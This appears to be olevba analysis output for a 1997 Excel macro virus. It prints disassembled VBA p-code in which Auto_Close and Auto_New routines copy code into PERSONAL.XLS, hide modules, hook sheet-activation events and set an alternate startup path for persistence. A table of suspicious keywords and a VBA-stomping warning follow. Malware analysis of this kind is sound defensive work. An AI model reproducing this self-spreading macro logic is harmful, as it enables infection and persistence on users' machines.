' 	MemLd AltStartupPath 
' 	LitStr 0x000D "\PERSONAL.XLS"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld newpers 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #314:
' 	LitVarSpecial (False)
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #315:
' 	Ld issrcVisible 
' 	LitDI2 0x0001 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #316:
' 	EndIfBlock 
' Line #317:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #318:
' 	EndIfBlock 
' Line #319:
' 	Ld activewb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #320:
' 	Ld selectsh 
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #321:
' 	Label Err 
' Line #322:
' 	ArgsCall Auto_New 0x0000 
' Line #323:
' 	EndSub 
' Line #324:
' 	FuncDefn (Sub Auto_Close())
' Line #325:
' 	OnError Err 
' Line #326:
' 	Ld Application 
' 	MemLd Caller 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0006 "String"
' 	Eq 
' 	IfBlock 
' Line #327:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Caller 
' 	FnLen 
' 	For 
' Line #328:
' 	Ld Application 
' 	MemLd Caller 
' 	Ld c 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "["
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	St start 
' 	EndIf 
' Line #329:
' 	Ld Application 
' 	MemLd Caller 
' 	Ld c 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "]"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld c 
' 	Ld start 
' 	Sub 
' 	St Length 
' 	EndIf 
' Line #330:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #331:
' 	Ld start 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #332:
' 	Ld Application 
' 	MemLd Caller 
' 	St Source 
' Line #333:
' 	ElseBlock 
' Line #334:
' 	Ld Application 
' 	MemLd Caller 
' 	Ld start 
' 	Ld Length 
' 	ArgsLd Mid$ 0x0003 
' 	St Source 
' Line #335:
' 	EndIfBlock 
' Line #336:
' 	LitDI2 0x0001 
' 	St closed 
' Line #337:
' 	Ld xlAutoOpen 
' 	Paren 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall RunAutoMacros 0x0001 
' Line #338:
' 	EndIfBlock 
' Line #339:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #340:
' 	LitDI2 0x0000 
' 	St closed 
' Line #341:
' 	Label Err 
' Line #342:
' 	EndSub 
' Line #343:
' 	FuncDefn (Sub Auto_New())
' Line #344:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #345:
' 	OnError Err 
' Line #346:
' 	LitDI2 0x0000 
' 	St fp 
' Line #347:
' 	StartForVariable 
' 	Ld sh 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	For 
' Line #348:
' 	Ld sh 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 " "
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St fp 
' 	EndIf 
' Line #349:
' 	StartForVariable 
' 	Ld sh 
' 	EndForVariable 
' 	NextVar 
' Line #350:
' 	Ld fp 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #351:
' 	LitStr 0x0015 "PERSONAL.XLS!Auto_New"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #352:
' 	LitStr 0x0015 "PERSONAL.XLS!Auto_New"
' 	Ld Application 
' 	MemSt OnWindow 
' Line #353:
' 	Ld closed 
' 	LitDI2 0x0000 
' 	Eq 
' 	ElseIfBlock 
' Line #354:
' 	LitStr 0x0008 "Auto_New"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #355:
' 	LitStr 0x0008 "Auto_New"
' 	Ld Application 
' 	MemSt OnWindow 
' Line #356:
' 	EndIfBlock 
' Line #357:
' 	StartForVariable 
' 	Ld sh 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd Modules 
' 	MemLd Count 
' 	For 
' Line #358:
' 	Ld sh 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 " "
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	LitStr 0x0001 " "
' 	ArgsLd Sheets 0x0001 
' 	MemSt Visible 
' 	EndIf 
' Line #359:
' 	StartForVariable 
' 	Ld sh 
' 	EndForVariable 
' 	NextVar 
' Line #360:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #361:
' 	LitStr 0x000B "C:\MSOFFICE"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "C:\MSOFFICE"
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #362:
' 	LitStr 0x0011 "C:\MSOFFICE\EXCEL"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "C:\MSOFFICE\EXCEL"
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #363:
' 	LitStr 0x0019 "C:\MSOFFICE\EXCEL\XLSTART"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0019 "C:\MSOFFICE\EXCEL\XLSTART"
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #364:
' 	LitStr 0x001D "C:\MSOFFICE\EXCEL\XLSTART\ALT"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001D "C:\MSOFFICE\EXCEL\XLSTART\ALT"
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #365:
' 	LitStr 0x001E "C:\MSOFFICE\EXCEL\XLSTART\ALT\"
' 	Ld Application 
' 	MemSt AltStartupPath 
' Line #366:
' 	Label Err 
' Line #367:
' 	EndSub 
' Line #368:
' Line #369:
' Line #370:
' Line #371:
' Line #372:
' Line #373:
' Line #374:
' Line #375:
' Line #376:
' Line #377:
' Line #378:
' Line #379:
' Line #380:
' Line #381:
' Line #382:
' Line #383:
' Line #384:
' Line #385:
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' Line #400:
' Line #401:
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' Line #406:
' 	QuoteRem 0x0000 0x0024 "Well I'd call that a work of art...."
' Line #407:
' 	QuoteRem 0x0000 0x0022 "December 1997. Hello Teign School!"
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' Line #412:
' Line #413:
' Line #414:
' Line #415:
' Line #416:
' Line #417:
' Line #418:
' Line #419:
' Line #420:
' Line #421:
' Line #422:
' Line #423:
' Line #424:
' Line #425:
' Line #426:
' Line #427:
' Line #428:
' Line #429:
' Line #430:
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' Line #435:
' Line #436:
' Line #437:
' Line #438:
' Line #439:
' Line #440:
' Line #441:
' Line #442:
' Line #443:
' Line #444:
' Line #445:
' Line #446:
' Line #447:
' Line #448:
' Line #449:
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' Line #454:
' Line #455:
' Line #456:
' Line #457:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Application.AltStart|May change which directory contains files to |
|          |upPath              |open at startup                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

